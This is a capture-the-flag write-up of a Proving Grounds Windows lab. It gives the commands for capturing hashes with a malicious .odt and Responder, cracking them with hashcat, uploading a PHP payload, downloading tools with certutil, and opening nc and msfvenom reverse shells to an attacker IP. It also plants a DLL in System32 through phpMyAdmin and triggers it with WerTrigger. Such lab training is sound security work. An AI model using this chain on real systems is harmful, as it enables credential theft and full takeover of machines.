---
title: Craft2
date: 2026-03-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - GPO
  - Responder
  - libre-office
  - smbclient
  - enum4linux-ng
  - venv
  - Hashcat
  - revshells
  - gobuster
  - ligolo-ng
  - php
  - wertrigger
  - updog
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Craft2"
---
"Don't try to be like Jackie. There is only one Jackie. Study computers instead."
-- Jackie Chan

Lets begin:

While waiting for a nmap I tried the IP in a browser.

![](Screenshot%202026-03-24%20at%2013.10.50.png)

![](Screenshot%202026-03-24%20at%2013.13.31.png)

![](Screenshot%202026-03-24%20at%2013.14.55.png)

This was interesting, I starting to have to use responder a lot more, its really good for leaking credentials.

![](Screenshot%202026-03-30%20at%2012.08.20.png)

When an .odt file is uploaded, it will be opened.

![](Screenshot%202026-03-30%20at%2012.09.43.png)

I was considering using this: https://github.com/jotyGill/macro-generator

Instead I found this: https://github.com/rmdavy/badodf/blob/master/badodt.py
This will create an .odt file that will connect to a responder session and dump the credentials. 

Clone this repository, when you run the script you will get this error:

![](Screenshot%202026-03-30%20at%2011.17.09.png)

This indicates we need to install the necessary libraries, to do this we'll need to create a virtual environment to ensure these are encapsulated. 

These commands will create and activate the venv, then install the library:

```Kali
python3 -m venv craft2_env
source craft2_env/bin/activate
pip install ezodf

```

Run the script:
```Kali
python mal-odt.py`
```

![](Screenshot%202026-03-30%20at%2012.07.39.png)
```Kali
sudo responder -I tun0
```

![](Screenshot%202026-03-24%20at%2015.40.55.png)

Upload the file .odt file

![](Screenshot%202026-03-24%20at%2015.41.31.png)

![](Screenshot%202026-03-24%20at%2015.42.16.png)

```Kali
hashcat -m 5600  cyber /usr/share/wordlists/rockyou.txt
```


![](Screenshot%202026-03-24%20at%2015.42.43.png)

`nxc smb 192.168.186.188 -u "thecybergeek" -p "winniethepooh"`

![](Screenshot%202026-03-24%20at%2015.29.03.png)

`enum4linux-ng -A 192.168.186.188 -u "thecybergeek" -p "winniethepooh`

![](Screenshot%202026-03-24%20at%2015.43.56.png)



I didn't see much after having a good look around, so I checked if I could upload a file and navigate to in via the http site. 

![](Screenshot%202026-03-30%20at%2015.37.32.png)

![](Screenshot%202026-03-30%20at%2015.37.05.png)

Create a php payload: 

![](Screenshot%202026-03-30%20at%2015.39.57.png)
![](Screenshot%202026-03-30%20at%2015.41.33.png)

Upload it:

![](Screenshot%202026-03-30%20at%2015.42.42.png)

Navigate to: http://192.168.204.188/payload.php
OR
```Kali
curl http://192.168.204.188/payload.php
```

![](Screenshot%202026-03-30%20at%2015.45.28.png)

![](Screenshot%202026-03-30%20at%2015.44.57.png)

Download into a temp folder a Ligolo agent, Netcat64 and RunasCs:

Start a server:

`updog -p 80` OR  `python -m http.server`



Download onto the victim machine:
```Victim
cd /
mkdir temp
cd temp
certutil -f -urlcache http://192.168.45.173/agent.exe agent.exe
certutil -f -urlcache http://192.168.45.173/nc64.exe nc.exe
certutil -f -urlcache http://192.168.45.173/RunasCs.exe runas.exe
```

![](Screenshot%202026-03-30%20at%2015.53.23.png)

![697](Screenshot%202026-03-30%20at%2015.52.23.png)

Start a listener:

```Kali
rlwrap nc -lvnp 1234
```

Create a reverse shell:

```Victim
.\runas.exe "thecybergeek" "winniethepooh" "C:\temp\nc.exe 192.168.45.173 1234 -e cmd.exe" 
```

Creating a 2-way tunnel with Ligolo-ng:

``` Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

```Kali
sudo ligolo-ng-proxy -selfcert
```

![](Screenshot%202026-03-28%20at%2009.25.09.png)

```Victim
.\agent.exe -connect 192.168.45.173:11601 -ignore-cert
```

![](Screenshot%202026-03-28%20at%2009.22.50.png)
``` Kali
sudo ip route add 240.0.0.1/32 dev ligolo
```

![](Screenshot%202026-03-28%20at%2009.14.53.png)

Check by navigating to the craft website on 240.0.0.1

![](Screenshot%202026-03-28%20at%2009.23.43.png)

`nmap 240.0.0.1 -p 3306  -Pn -v `

![](Screenshot%202026-03-28%20at%2009.10.34.png)

![](Screenshot%202026-03-28%20at%2014.50.40.png)

![](Screenshot%202026-03-28%20at%2014.53.07.png)



![](Screenshot%202026-03-28%20at%2014.52.50.png)
![](Screenshot%202026-03-28%20at%2014.52.11.png)

This may be a way to interact with the OS. 

![](Screenshot%202026-03-28%20at%2015.10.44.png)

``` phpmyadmin
SELECT "New-post" INTO OUTFILE '/temp/test.txt'; 
```

![](Screenshot%202026-03-28%20at%2015.12.57.png)

![](Screenshot%202026-03-28%20at%2015.17.51.png)




WerTrigger: 
WerTrigger will trigger our file once we have used our access to phpmyadmin to plant malicious data. 

Git clone the WerTrigger repo:
```Kali
git clone https://github.com/sailay1996/WerTrigger.git
cd WerTrigger/bin
```

Create a malicious file called phoneinfo.dll using msfvenom:
```Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.173 LPORT=1337 -f dll -o phoneinfo.dll
```

Start a server:
```Kali
updog -p 80
```

Transfer the files to the victim machine:
```Victim
certutil -f -urlcache http://192.168.45.173/phoneinfo.dll phoneinfo.dll
certutil -f -urlcache http://192.168.45.173/Report.wer Report.wer
certutil -f -urlcache http://192.168.45.173/WerTrigger.exe
```

![](Screenshot%202026-03-29%20at%2009.23.41.png)

![](Screenshot%202026-03-28%20at%2019.26.11.png)


Using SQL, move the contents of the malicious file to a new file in the System32 folder:

```Victim
SELECT LOAD_FILE ("/temp/phoneinfo.dll") INTO DUMPFILE '/Windows/System32/phoneinfo.dll'; 
```

![](Screenshot%202026-03-28%20at%2019.25.02.png)

Start a listener:
```Kali
rlwrap nc -lvnp -1337
```

Launch the executable:
```Victim
.\WerTrigger.exe
```

![](Screenshot%202026-03-29%20at%2009.30.51.png)

![](Screenshot%202026-03-28%20at%2019.23.25.png)

Bye.